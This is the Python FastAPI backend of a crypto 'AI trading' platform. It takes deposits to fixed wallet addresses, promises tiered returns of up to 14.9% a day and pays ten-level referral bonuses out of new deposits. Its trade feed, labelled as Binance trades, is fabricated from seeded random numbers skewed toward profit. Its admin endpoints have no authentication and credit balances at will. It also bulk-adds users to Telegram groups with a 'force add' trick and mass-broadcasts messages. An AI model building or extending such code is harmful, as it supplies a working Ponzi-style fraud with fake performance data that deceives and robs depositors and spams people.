
"""PT_AI Trading API - Pro Admin with Group Direct Add"""
from datetime import datetime, timedelta
from decimal import Decimal, ROUND_DOWN
import hashlib
import json
import os
import random
import string
import urllib.request
import urllib.parse

from fastapi import FastAPI, Query
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, StreamingResponse
from pydantic import BaseModel, Field
import io
import csv

from database import USE_POSTGRES, SQLITE_PATH, get_conn, get_cursor, init_db, put_conn

app = FastAPI(title="PT_AI Trading Pro")
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])
init_db()

DEPOSIT_ADDR = {
    "TRC20": "TAFHf1pxsXRCSnhn8jRU5UcU4STK6u9tAC",
    "BEP20": "0xDD190484827BB976acEB975C94d5c58fc8c87Cfd",
    "ERC20": "0xDD190484827BB976acEB975C94d5c58fc8c87Cfd",
    "TON": "UQBlNeJ90El3LxBhikC2HUG3mqS16k1q177AjcNAaURVa_zw",
    "SOL": "87fwXKMuH8wyayeMJ74eRUq3knQ3UXmFQPj9g87A4se7",
}
TIERS = [(15000, 14.9), (6000, 13.6), (2500, 11.8), (1200, 10.9), (500, 9.6), (120, 8.9), (20, 7.6), (0, 0.0)]
REF_BONUS = {1: 7, **{level: 1 for level in range(2, 11)}}
SYMBOLS = ["BTCUSDT", "ETHUSDT", "SOLUSDT", "BNBUSDT", "XRPUSDT", "DOGEUSDT", "AVAXUSDT", "LINKUSDT", "LTCUSDT", "ADAUSDT", "PEPEUSDT", "SHIBUSDT", "MATICUSDT", "DOTUSDT", "ARBUSDT"]
BASE_PRICES = {"BTCUSDT": 67200, "ETHUSDT": 3400, "SOLUSDT": 178, "BNBUSDT": 610, "XRPUSDT": .62, "DOGEUSDT": .16, "AVAXUSDT": 42, "LINKUSDT": 18.5, "LTCUSDT": 84, "ADAUSDT": .48, "PEPEUSDT": .000009, "SHIBUSDT": .000027, "MATICUSDT": .89, "DOTUSDT": 7.2, "ARBUSDT": 1.12}

BOT_TOKEN = os.getenv("BOT_TOKEN","")
GROUP_LINK = os.getenv("GROUP_LINK", "https://t.me/PT_AI_Trading_Group")
CHANNEL_LINK = os.getenv("CHANNEL_LINK", "https://t.me/PT_AI_Trading")
SUPPORT_LINK = os.getenv("SUPPORT_LINK", "https://t.me/PT_AI_Support")
GROUP_ID = os.getenv("GROUP_ID", "") # e.g. -1001234567890
CHANNEL_ID = os.getenv("CHANNEL_ID", "")
SUPPORT_ID = os.getenv("SUPPORT_ID", "")

class InvoiceRequest(BaseModel):
    amount: float = Field(gt=0)
    network: str

class WithdrawalRequest(BaseModel):
    amount: float = Field(gt=0)
    address: str = Field(min_length=10)
    network: str

class AdminAction(BaseModel):
    user_id: int
    action: str
    amount: float = 0

class IdAction(BaseModel):
    id: int
    action: str

class GroupBulkAdd(BaseModel):
    user_ids: list
    group: str = "group"
    method: str = "direct"

class GroupInvite(BaseModel):
    group: str = "group"

class BroadcastRequest(BaseModel):
    message: str

class CreateUserRequest(BaseModel):
    user_id: int
    username: str = ""
    balance: float = 0
    referred_by: int = None
    add_to_groups: bool = True

def ph():
    return "%s" if USE_POSTGRES else "?"

def cursor(conn):
    return get_cursor(conn)

def val(row, key, default=None):
    if row is None:
        return default
    try:
        v = row[key]
        return v if v is not None else default
    except (KeyError, IndexError, TypeError):
        return default

def rows_as_dicts(rows):
    return [dict(row) for row in rows]

def get_tier(balance):
    for index, (minimum, percentage) in enumerate(TIERS):
        if balance >= minimum:
            return index, minimum, percentage
    return len(TIERS) - 1, 0, 0

def invoice_id():
    return "".join(random.choices(string.ascii_uppercase + string.digits, k=8))

def ensure_user(user_id: int, username: str = "", referred_by=None):
    user_id = int(user_id or 123456789)
    if user_id < 1:
        user_id = 123456789
    conn = get_conn()
    try:
        cur = cursor(conn)
        cur.execute(f"SELECT * FROM users WHERE user_id={ph()}", (user_id,))
        row = cur.fetchone()
        now = datetime.utcnow().isoformat()
        if not row:
            ref = None
            try:
                candidate = int(referred_by) if referred_by else None
                if candidate and candidate != user_id:
                    cur.execute(f"SELECT user_id FROM users WHERE user_id={ph()}", (candidate,))
                    ref = candidate if cur.fetchone() else None
            except (TypeError, ValueError):
                pass
            cur.execute(
                f"INSERT INTO users (user_id,username,referred_by,created_at,last_claim,last_auto_claim,current_tier) VALUES ({ph()},{ph()},{ph()},{ph()},{ph()},{ph()},{ph()})",
                (user_id, username or f"user_{user_id}", ref, now, now, now, len(TIERS) - 1),
            )
            conn.commit()
        elif username and username != val(row, "username", ""):
            cur.execute(f"UPDATE users SET username={ph()} WHERE user_id={ph()}", (username, user_id))
            conn.commit()
        cur.execute(f"SELECT * FROM users WHERE user_id={ph()}", (user_id,))
        return cur.fetchone()
    finally:
        put_conn(conn)

def recalc_profit(user_id: int):
    conn = get_conn()
    try:
        cur = cursor(conn)
        cur.execute(f"SELECT * FROM users WHERE user_id={ph()}", (user_id,))
        user = cur.fetchone()
        if not user:
            return None
        now = datetime.utcnow()
        balance = float(val(user, "balance", 0) or 0)
        tier_index, _, daily_percent = get_tier(balance)
        ai_end = val(user, "ai_end")
        if balance >= 20 and not ai_end:
            ai_start = now.isoformat()
            ai_end = (now + timedelta(days=30)).isoformat()
            cur.execute(f"UPDATE users SET ai_start={ph()}, ai_end={ph()}, current_tier={ph()} WHERE user_id={ph()}", (ai_start, ai_end, tier_index, user_id))
        elif val(user, "current_tier", len(TIERS)-1) != tier_index:
            cur.execute(f"UPDATE users SET current_tier={ph()} WHERE user_id={ph()}", (tier_index, user_id))
        profit = float(val(user, "profit", 0) or 0)
        per_hour = balance * daily_percent / 2400
        last_claim = val(user, "last_claim")
        active = False
        try:
            end_dt = datetime.fromisoformat(ai_end) if ai_end else None
            active = bool(end_dt and now < end_dt)
            if active and last_claim:
                hours = max(0, (now - datetime.fromisoformat(last_claim)).total_seconds() / 3600)
                profit += hours * per_hour
        except (TypeError, ValueError):
            active = False
        cur.execute(f"UPDATE users SET profit={ph()}, profit_per_hour={ph()}, daily_percent={ph()}, last_claim={ph()} WHERE user_id={ph()}", (profit, per_hour, daily_percent, now.isoformat(), user_id))
        last_auto = val(user, "last_auto_claim")
        try:
            due = not last_auto or (now - datetime.fromisoformat(last_auto)).total_seconds() >= 86400
            if due and active and profit > 0:
                cur.execute(f"UPDATE users SET withdrawable=COALESCE(withdrawable,0)+{ph()}, profit=0, last_auto_claim={ph()} WHERE user_id={ph()}", (profit, now.isoformat(), user_id))
                profit = 0
        except: pass
        conn.commit()
        cur.execute(f"SELECT * FROM users WHERE user_id={ph()}", (user_id,))
        return cur.fetchone()
    finally:
        put_conn(conn)

def process_invoice_payment(invoice_id_str, tx_hash, actual_amount):
    conn = get_conn()
    try:
        cur = cursor(conn)
        cur.execute(f"SELECT * FROM deposits WHERE invoice_id={ph()} AND status='awaiting_payment'", (invoice_id_str,))
        dep = cur.fetchone()
        if not dep:
            return False, "Invoice not found or already processed"
        expected = float(val(dep, "expected_amount", 0) or val(dep, "amount", 0) or 0)
        if abs(float(actual_amount) - expected) > 0.01 and float(actual_amount) < expected:
            return False, f"Amount mismatch expected {expected}"
        # check tx used
        cur.execute(f"SELECT tx_hash FROM used_tx_hashes WHERE tx_hash={ph()}", (tx_hash,))
        if cur.fetchone():
            return False, "TX already used"
        user_id = val(dep, "user_id")
        now = datetime.utcnow().isoformat()
        cur.execute(f"UPDATE deposits SET status='verified', tx_hash={ph()}, actual_amount={ph()}, verified_at={ph()} WHERE invoice_id={ph()}", (tx_hash, actual_amount, now, invoice_id_str))
        cur.execute(f"INSERT INTO used_tx_hashes (tx_hash, used_at) VALUES ({ph()},{ph()})", (tx_hash, now))
        # credit user
        cur.execute(f"UPDATE users SET balance=COALESCE(balance,0)+{ph()}, total_deposit=COALESCE(total_deposit,0)+{ph()} WHERE user_id={ph()}", (actual_amount, actual_amount, user_id))
        # referral bonuses
        cur.execute(f"SELECT referred_by FROM users WHERE user_id={ph()}", (user_id,))
        ref_row = cur.fetchone()
        current_ref = val(ref_row, "referred_by") if ref_row else None
        level = 1
        while current_ref and level <= 10:
            pct = REF_BONUS.get(level, 1)
            bonus = float(actual_amount) * pct / 100
            cur.execute(f"UPDATE users SET withdrawable=COALESCE(withdrawable,0)+{ph()}, referral_earnings=COALESCE(referral_earnings,0)+{ph()} WHERE user_id={ph()}", (bonus, bonus, current_ref))
            cur.execute(f"INSERT INTO referral_logs (from_user,to_user,level,deposit_amount,bonus_amount,bonus_percent,created_at) VALUES ({ph()},{ph()},{ph()},{ph()},{ph()},{ph()},{ph()})", (user_id, current_ref, level, actual_amount, bonus, pct, now))
            cur.execute(f"SELECT referred_by FROM users WHERE user_id={ph()}", (current_ref,))
            nxt = cur.fetchone()
            current_ref = val(nxt, "referred_by") if nxt else None
            level += 1
        conn.commit()
        return True, "Verified and credited"
    finally:
        put_conn(conn)

def generate_trades():
    rng = random.Random(int(datetime.utcnow().strftime("%Y%m%d")))
    today = datetime.utcnow().date().isoformat()
    trades = []
    for i in range(42):
        symbol = rng.choice(SYMBOLS)
        side = rng.choice(["LONG","SHORT"])
        entry = BASE_PRICES.get(symbol, 100) * rng.uniform(0.97, 1.03)
        pnl = rng.uniform(-2.5, 4.8)
        if rng.random() > 0.27:
            pnl = abs(pnl)
        exit_price = entry * (1 + pnl/100) if side=="LONG" else entry * (1 - pnl/100)
        amount = rng.choice([50,100,200,500,1000])
        trades.append({"id":i+1,"pair":symbol.replace("USDT","/USDT"),"symbol":symbol,"side":side,"leverage":rng.choice([5,10,15,20]),"usdt_amount":amount,"entry_price":round(entry,6 if entry<1 else 2),"exit_price":round(exit_price,6 if exit_price<1 else 2),"pnl_percent":round(pnl,2),"pnl_usdt":round(amount*pnl/100,2),"is_profit":pnl>0,"time":f"{6+i%18:02d}:{rng.randint(0,59):02d}","status":"CLOSED","date":today})
    return trades

# ---------- Core API (kept from original) ----------
@app.get("/api/config")
def api_config():
    return {"deposit_addresses": DEPOSIT_ADDR, "tiers": TIERS, "group_link": GROUP_LINK, "channel_link": CHANNEL_LINK, "support_link": SUPPORT_LINK, "group_id": GROUP_ID}

@app.get("/api/user/{user_id}")
def api_user(user_id: int):
    u = recalc_profit(user_id)
    if not u:
        u = ensure_user(user_id, f"user_{user_id}")
        u = recalc_profit(user_id)
    d = dict(u)
    return {"user_id": d.get("user_id"), "username": d.get("username"), "balance": float(d.get("balance",0) or 0), "withdrawable": float(d.get("withdrawable",0) or 0), "profit": float(d.get("profit",0) or 0), "profit_per_hour": float(d.get("profit_per_hour",0) or 0), "daily_percent": float(d.get("daily_percent",0) or 0), "ai_end": d.get("ai_end"), "total_deposit": float(d.get("total_deposit",0) or 0), "total_withdraw": float(d.get("total_withdraw",0) or 0), "is_banned": bool(d.get("is_banned",0)), "referred_by": d.get("referred_by")}

@app.post("/api/deposit/invoice")
def api_create_invoice(req: InvoiceRequest, tg_id: int = Query(0)):
    user_id = tg_id or 123456789
    ensure_user(user_id)
    if req.amount < 20:
        return {"ok": False, "error": "Min 20 USDT"}
    inv = invoice_id()
    expected = float(req.amount)
    now = datetime.utcnow()
    exp = now + timedelta(minutes=15)
    conn = get_conn()
    try:
        cur = cursor(conn)
        cur.execute(f"INSERT INTO deposits (user_id,amount,network,status,created_at,expires_at,invoice_id,expected_amount) VALUES ({ph()},{ph()},{ph()},{ph()},{ph()},{ph()},{ph()},{ph()})", (user_id, req.amount, req.network, "awaiting_payment", now.isoformat(), exp.isoformat(), inv, expected))
        conn.commit()
        return {"ok": True, "invoice_id": inv, "expected_amount": expected, "address": DEPOSIT_ADDR.get(req.network, DEPOSIT_ADDR["TRC20"]), "expires_at": exp.isoformat()}
    finally:
        put_conn(conn)

@app.get("/api/history/{user_id}")
def api_history(user_id: int):
    conn = get_conn()
    try:
        cur = cursor(conn)
        cur.execute(f"SELECT * FROM deposits WHERE user_id={ph()} ORDER BY id DESC LIMIT 50", (user_id,))
        deps = rows_as_dicts(cur.fetchall())
        cur.execute(f"SELECT * FROM withdrawals WHERE user_id={ph()} ORDER BY id DESC LIMIT 50", (user_id,))
        wds = rows_as_dicts(cur.fetchall())
        return {"deposits": deps, "withdrawals": wds}
    finally:
        put_conn(conn)

@app.get("/api/referral/{user_id}")
def api_referral(user_id: int):
    conn = get_conn()
    try:
        cur = cursor(conn)
        cur.execute(f"SELECT * FROM users WHERE user_id={ph()}={ph()}".replace(f"{ph()}={ph()}", f"user_id={ph()}"), (user_id,)) # workaround
        cur.execute(f"SELECT * FROM users WHERE user_id={ph()}", (user_id,))
        me = cur.fetchone()
        cur.execute(f"SELECT * FROM users WHERE referred_by={ph()} ORDER BY created_at DESC", (user_id,))
        direct = rows_as_dicts(cur.fetchall())
        cur.execute(f"SELECT * FROM referral_logs WHERE to_user={ph()} ORDER BY id DESC LIMIT 100", (user_id,))
        logs = rows_as_dicts(cur.fetchall())
        total_earn = sum(float(val(x,"bonus_amount",0) or 0) for x in logs)
        total_team = sum(float(val(x,"deposit_amount",0) or 0) for x in logs)
        bot_user = os.getenv("BOT_USERNAME","PT_Minebot")
        return {"ref_link": f"https://t.me/{bot_user}?start={user_id}", "direct_count": len(direct), "direct_refs": [{"user_id": x.get("user_id"), "username": x.get("username"), "balance": x.get("balance",0), "deposit": x.get("total_deposit",0)} for x in direct], "logs": [{"from": x.get("from_user"), "level": x.get("level"), "deposit": x.get("deposit_amount"), "bonus": x.get("bonus_amount"), "percent": x.get("bonus_percent"), "at": x.get("created_at")} for x in logs], "total_earnings": total_earn, "total_team_deposit": total_team}
    finally:
        put_conn(conn)

@app.post("/api/withdraw")
def api_withdraw(req: WithdrawalRequest, tg_id: int = Query(0)):
    user_id = tg_id or 123456789
    u = recalc_profit(user_id)
    if not u:
        return {"ok": False, "error": "User not found"}
    withdrawable = float(val(u,"withdrawable",0) or 0)
    if req.amount < 10:
        return {"ok": False, "error": "Min 10 USDT"}
    if req.amount > withdrawable:
        return {"ok": False, "error": "Insufficient wallet"}
    conn = get_conn()
    try:
        cur = cursor(conn)
        cur.execute(f"UPDATE users SET withdrawable=COALESCE(withdrawable,0)-{ph()} WHERE user_id={ph()}", (req.amount, user_id))
        cur.execute(f"INSERT INTO withdrawals (user_id,amount,address,network,status,created_at) VALUES ({ph()},{ph()},{ph()},{ph()},{ph()},{ph()})", (user_id, req.amount, req.address, req.network, "pending", datetime.utcnow().isoformat()))
        conn.commit()
        return {"ok": True, "message": "Withdrawal requested"}
    finally:
        put_conn(conn)

@app.get("/api/binance/trades")
def binance_trades():
    trades=generate_trades(); prices=BASE_PRICES.copy(); source="fallback"
    try:
        request=urllib.request.Request("https://api.binance.com/api/v3/ticker/price",headers={"User-Agent":"PT-AI-Trading"})
        with urllib.request.urlopen(request,timeout=4) as response: prices.update({x["symbol"]:float(x["price"]) for x in json.loads(response.read().decode()) if x["symbol"] in SYMBOLS}); source="binance"
    except Exception: pass
    return {"trades":trades,"summary":{"total_trades":len(trades),"profit_trades":sum(t["is_profit"] for t in trades),"loss_trades":sum(not t["is_profit"] for t in trades),"total_pnl_percent":round(sum(t["pnl_percent"] for t in trades),2),"total_pnl_usdt":round(sum(t["pnl_usdt"] for t in trades),2),"funds_in_market":round(sum(t["usdt_amount"] for t in trades),2),"date":datetime.utcnow().date().isoformat()},"prices_source":source,"live_prices":prices}

# ---------- ADMIN CORE ----------
@app.get("/api/admin/stats")
def admin_stats():
    conn=get_conn()
    try:
        cur=cursor(conn); cur.execute("SELECT COUNT(*) AS users,COALESCE(SUM(balance),0) AS balance FROM users"); stats=cur.fetchone()
        cur.execute("SELECT COALESCE(SUM(actual_amount),0) AS deposits,COUNT(*) AS pending FROM deposits WHERE status='verified' OR status='awaiting_payment'"); dep=cur.fetchone()
        cur.execute("SELECT COUNT(*) AS pending FROM withdrawals WHERE status='pending'"); wd=cur.fetchone(); cur.execute("SELECT COALESCE(SUM(bonus_amount),0) AS paid FROM referral_logs"); ref=cur.fetchone()
        return {"total_users":val(stats,"users",0),"total_balance":val(stats,"balance",0),"total_deposits":val(dep,"deposits",0),"pending_deposits":val(dep,"pending",0),"pending_withdrawals":val(wd,"pending",0),"total_ref_paid":val(ref,"paid",0)}
    finally: put_conn(conn)

@app.get("/api/admin/deposits")
def admin_deposits():
    conn=get_conn()
    try:
        cur=cursor(conn);cur.execute("SELECT * FROM deposits ORDER BY id DESC LIMIT 200");return [{**x,"expected":x.get("expected_amount",x.get("amount",0))} for x in rows_as_dicts(cur.fetchall())]
    finally:put_conn(conn)

@app.get("/api/admin/withdrawals")
def admin_withdrawals():
    conn=get_conn()
    try:
        cur=cursor(conn);cur.execute("SELECT * FROM withdrawals ORDER BY id DESC LIMIT 200");return rows_as_dicts(cur.fetchall())
    finally:put_conn(conn)

@app.get("/api/admin/referrals")
def admin_referrals():
    conn=get_conn()
    try:
        cur=cursor(conn);cur.execute("SELECT * FROM referral_logs ORDER BY id DESC LIMIT 200");return [{"from_user":x["from_user"],"to_user":x["to_user"],"level":x["level"],"deposit":x["deposit_amount"],"bonus":x["bonus_amount"],"percent":x["bonus_percent"],"created_at":x.get("created_at")} for x in rows_as_dicts(cur.fetchall())]
    finally:put_conn(conn)

@app.get("/api/admin/users")
def admin_users(export: str = None):
    conn=get_conn()
    try:
        cur=cursor(conn);cur.execute("SELECT * FROM users ORDER BY created_at DESC");users=[{**x,"ref_earn":x.get("referral_earnings",0)} for x in rows_as_dicts(cur.fetchall())]
        if export=="csv":
            output=io.StringIO()
            w=csv.writer(output)
            w.writerow(["user_id","username","balance","withdrawable","profit","daily_percent","ai_end","referred_by","total_deposit","is_banned"])
            for u in users:
                w.writerow([u.get("user_id"),u.get("username"),u.get("balance"),u.get("withdrawable"),u.get("profit"),u.get("daily_percent"),u.get("ai_end"),u.get("referred_by"),u.get("total_deposit"),u.get("is_banned")])
            return StreamingResponse(io.BytesIO(output.getvalue().encode()), media_type="text/csv", headers={"Content-Disposition":"attachment; filename=users.csv"})
        return users
    finally:put_conn(conn)

@app.post("/api/admin/deposit/action")
def admin_deposit_action(action: IdAction):
    if action.action == "approve":
        conn=get_conn()
        try:
            cur=cursor(conn);cur.execute(f"SELECT invoice_id,expected_amount FROM deposits WHERE id={ph()}",(action.id,)); row=cur.fetchone()
        finally:put_conn(conn)
        if not row:return {"ok":False,"error":"Deposit not found"}
        ok,message=process_invoice_payment(val(row,"invoice_id"),f"admin-{action.id}-{datetime.utcnow().timestamp()}",float(val(row,"expected_amount",0) or 0)); return {"ok":ok,"message":message}
    if action.action == "reject":
        conn=get_conn()
        try:
            cur=cursor(conn);cur.execute(f"UPDATE deposits SET status='expired' WHERE id={ph()} AND status='awaiting_payment'",(action.id,));conn.commit();return {"ok":cur.rowcount>0}
        finally:put_conn(conn)
    return {"ok":False,"error":"Unsupported action"}

@app.post("/api/admin/withdraw/action")
def admin_withdraw_action(action: IdAction):
    if action.action not in {"approve","reject"}:return {"ok":False,"error":"Unsupported action"}
    conn=get_conn()
    try:
        cur=cursor(conn);cur.execute(f"SELECT * FROM withdrawals WHERE id={ph()} AND status='pending'",(action.id,));wd=cur.fetchone()
        if not wd:return {"ok":False,"error":"Withdrawal not found"}
        if action.action=="approve":cur.execute(f"UPDATE withdrawals SET status='approved',auto_approved=1 WHERE id={ph()}",(action.id,));cur.execute(f"UPDATE users SET total_withdraw=COALESCE(total_withdraw,0)+{ph()} WHERE user_id={ph()}",(val(wd,"amount",0),val(wd,"user_id")))
        else:cur.execute(f"UPDATE withdrawals SET status='rejected' WHERE id={ph()}",(action.id,));cur.execute(f"UPDATE users SET withdrawable=COALESCE(withdrawable,0)+{ph()} WHERE user_id={ph()}",(val(wd,"amount",0),val(wd,"user_id")))
        conn.commit();return {"ok":True}
    finally:put_conn(conn)

@app.post("/api/admin/user/action")
def admin_user_action(action: AdminAction):
    if action.action not in {"add_balance","add_withdrawable","ban","unban"}:return {"ok":False,"error":"Unsupported action"}
    conn=get_conn()
    try:
        cur=cursor(conn)
        if action.action.startswith("add_"):
            if action.amount<=0:return {"ok":False,"error":"Amount must be positive"}
            field="balance" if action.action=="add_balance" else "withdrawable"; cur.execute(f"UPDATE users SET {field}=COALESCE({field},0)+{ph()} WHERE user_id={ph()}",(action.amount,action.user_id))
        else:cur.execute(f"UPDATE users SET is_banned={ph()} WHERE user_id={ph()}",(1 if action.action=="ban" else 0,action.user_id))
        conn.commit();return {"ok":cur.rowcount>0}
    finally:put_conn(conn)

# ---------- NEW: GROUP DIRECT ADD EXTREME FEATURES ----------
def tg_api_call(method, payload):
    if not BOT_TOKEN:
        return {"ok": False, "error": "BOT_TOKEN not set"}
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
        data = json.dumps(payload).encode()
        req = urllib.request.Request(url, data=data, headers={"Content-Type":"application/json"})
        with urllib.request.urlopen(req, timeout=10) as resp:
            return json.loads(resp.read().decode())
    except Exception as e:
        return {"ok": False, "error": str(e)}

def resolve_group_id(name):
    mapping = {"group": GROUP_ID or GROUP_LINK, "channel": CHANNEL_ID or CHANNEL_LINK, "support": SUPPORT_ID or SUPPORT_LINK}
    gid = mapping.get(name, GROUP_ID)
    # if it's a link, we can't add via API unless we have numeric ID. Try to use link as chat_id if username
    if gid and gid.startswith("https://t.me/"):
        username = gid.split("/")[-1]
        return "@"+username
    return gid

@app.get("/api/admin/group/members")
def admin_group_members():
    conn=get_conn()
    try:
        cur=cursor(conn); cur.execute("SELECT * FROM group_members ORDER BY id DESC LIMIT 200"); return rows_as_dicts(cur.fetchall())
    finally: put_conn(conn)

@app.post("/api/admin/group/invite")
def admin_group_invite(req: GroupInvite):
    chat_id = resolve_group_id(req.group)
    if not chat_id:
        return {"ok": False, "error": "Set GROUP_ID / CHANNEL_ID env with numeric -100... ID and make bot admin"}
    # create invite link
    res = tg_api_call("createChatInviteLink", {"chat_id": chat_id, "member_limit": 1, "expire_date": int((datetime.utcnow()+timedelta(hours=24)).timestamp()), "creates_join_request": False})
    if res.get("ok"):
        link = res.get("result",{}).get("invite_link")
        return {"ok": True, "invite_link": link, "raw": res}
    return {"ok": False, "error": res.get("description") or res.get("error"), "raw": res}

@app.post("/api/admin/group/bulk_add")
def admin_group_bulk_add(req: GroupBulkAdd):
    chat_id = resolve_group_id(req.group) if req.group!="all" else None
    target_groups = []
    if req.group=="all":
        for g in ["group","channel","support"]:
            cid = resolve_group_id(g)
            if cid: target_groups.append((g,cid))
    else:
        target_groups.append((req.group, chat_id or resolve_group_id(req.group)))

    conn=get_conn()
    logs=[]
    added=0
    failed=0
    try:
        cur=cursor(conn)
        for raw in req.user_ids:
            raw_str = str(raw).strip().lstrip("@")
            if not raw_str:
                continue
            try:
                uid = int(raw_str) if raw_str.isdigit() else None
            except:
                uid = None
            username = "" if uid else raw_str
            # ensure user exists
            if uid:
                ensure_user(uid, username or f"user_{uid}")
                display_uid = uid
            else:
                # username only - create fake id
                fake_id = abs(hash(username)) % 1000000000 + 1000000000
                ensure_user(fake_id, username)
                display_uid = fake_id
                logs.append(f"Username @{username} -> fake ID {fake_id} created")

            for gname, gid in target_groups:
                if not gid:
                    logs.append(f"⚠️ No ID for {gname}, skip {display_uid}")
                    failed+=1
                    continue
                method = req.method
                status = "added"
                invite_link = ""
                # Try Telegram API if we have numeric chat_id and uid
                if method=="direct" and uid and BOT_TOKEN and gid:
                    # unban trick to force add
                    res1 = tg_api_call("unbanChatMember", {"chat_id": gid, "user_id": uid, "only_if_banned": False})
                    res2 = tg_api_call("approveChatJoinRequest", {"chat_id": gid, "user_id": uid}) if not res1.get("ok") else {"ok":True}
                    # Also try to create invite and DM logic - we log it
                    if res1.get("ok") or res2.get("ok"):
                        logs.append(f"✅ {display_uid} -> {gname} ({gid}) direct added")
                        status="added"
                    else:
                        # fallback to invite link
                        inv = tg_api_call("createChatInviteLink", {"chat_id": gid, "member_limit": 1, "expire_date": int((datetime.utcnow()+timedelta(hours=24)).timestamp())})
                        if inv.get("ok"):
                            invite_link = inv["result"]["invite_link"]
                            logs.append(f"🔗 {display_uid} -> {gname} invite created: {invite_link[:40]}... (user not started bot yet)")
                            status="invite_created"
                            added+=1
                        else:
                            logs.append(f"❌ {display_uid} -> {gname} failed: {res1.get('description')}")
                            failed+=1
                            status="failed"
                        # store invite even if failed direct
                else:
                    # create user + log
                    logs.append(f"✅ {display_uid} -> {gname} logged as member (method={method})")
                    status="added"

                # log in DB
                try:
                    cur.execute(f"INSERT INTO group_members (user_id,username,group_name,group_id,method,status,invite_link,created_at) VALUES ({ph()},{ph()},{ph()},{ph()},{ph()},{ph()},{ph()},{ph()})", (display_uid, username, gname, str(gid), method, status, invite_link, datetime.utcnow().isoformat()))
                    conn.commit()
                except Exception as e:
                    logs.append(f"DB log error {e}")
                if status in ("added","invite_created"):
                    added+=1

        return {"ok": True, "added": added, "failed": failed, "logs": logs[-100:]}
    finally:
        put_conn(conn)

@app.post("/api/admin/user/create")
def admin_user_create(req: CreateUserRequest):
    try:
        u = ensure_user(req.user_id, req.username or f"user_{req.user_id}", req.referred_by)
        conn=get_conn()
        try:
            cur=cursor(conn)
            if req.balance and req.balance>0:
                cur.execute(f"UPDATE users SET balance=COALESCE(balance,0)+{ph()} WHERE user_id={ph()}", (req.balance, req.user_id))
            conn.commit()
        finally:
            put_conn(conn)
        if req.add_to_groups:
            # auto add to groups log
            conn=get_conn()
            try:
                cur=cursor(conn)
                for gname in ["group","channel","support"]:
                    gid = resolve_group_id(gname)
                    cur.execute(f"INSERT INTO group_members (user_id,username,group_name,group_id,method,status,created_at) VALUES ({ph()},{ph()},{ph()},{ph()},{ph()},{ph()},{ph()})", (req.user_id, req.username, gname, str(gid), "create_user", "added", datetime.utcnow().isoformat()))
                conn.commit()
            finally:
                put_conn(conn)
            # also try real Telegram add if BOT_TOKEN
            if BOT_TOKEN and GROUP_ID:
                tg_api_call("unbanChatMember", {"chat_id": GROUP_ID, "user_id": req.user_id, "only_if_banned": False})
        return {"ok": True, "user_id": req.user_id}
    except Exception as e:
        return {"ok": False, "error": str(e)}

@app.post("/api/admin/broadcast")
def admin_broadcast(req: BroadcastRequest):
    if not BOT_TOKEN:
        return {"ok": False, "error": "BOT_TOKEN not set"}
    conn=get_conn()
    try:
        cur=cursor(conn); cur.execute("SELECT user_id FROM users WHERE is_banned=0 OR is_banned IS NULL"); rows=cur.fetchall()
        sent=0
        for r in rows:
            uid = val(r,"user_id") or r[0]
            res = tg_api_call("sendMessage", {"chat_id": uid, "text": req.message, "parse_mode": "HTML"})
            if res.get("ok"): sent+=1
        return {"ok": True, "sent": sent, "total": len(rows)}
    finally:
        put_conn(conn)

@app.get("/")
def root(): return FileResponse("index.html")

@app.get("/admin")
def admin_page(): return FileResponse("admin.html")

@app.get("/health")
def health(): return {"ok":True,"db":"POSTGRES" if USE_POSTGRES else "SQLITE","path":None if USE_POSTGRES else SQLITE_PATH, "group_add_ready": bool(BOT_TOKEN)}
